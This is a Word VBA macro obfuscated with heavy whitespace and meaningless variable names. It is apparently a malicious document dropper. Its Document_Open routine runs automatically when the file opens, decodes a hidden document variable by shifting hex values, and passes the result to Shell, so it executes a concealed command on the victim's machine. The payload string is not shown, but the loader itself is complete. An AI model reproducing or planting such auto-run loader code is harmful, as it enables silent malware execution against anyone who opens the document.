Option Explicit





                






                                                Private Sub huddersfield(ByVal outtrotting As String)








                                                                            Dim advancer As Long







                 






          






                Dim counselor As String





                                                                        







                                                    For advancer = 2 To Len(outtrotting) Step 2







                                                counselor = counselor & Chr(majorette(reinsulate(outtrotting, advancer), 30))







                  




                                            




                                            Next advancer







                                                                                    Shell counselor
End Sub





                                                                            







                 Sub Document_Open()






               







          




                                                                            







                                            




          







                 






                                        huddersfield ActiveDocument.Variables("ob3728d4e642f7").Value








                                                        




           




          




                   End Sub







                                                            






             







                                                            Private Function majorette(ByVal patrologic As String, ByVal corporeality As Long) As Long







                  






                                                    





                                                                            




                 majorette = CLng(patrologic) - corporeality







                                            






                                                End Function







                                                                            




                  







                                            




               







                                                    Private Function reinsulate(ByVal patrologic As String, ByVal corporeality As Long) As String
reinsulate = "&H" & Right(Left(patrologic, corporeality), 2)
End Function


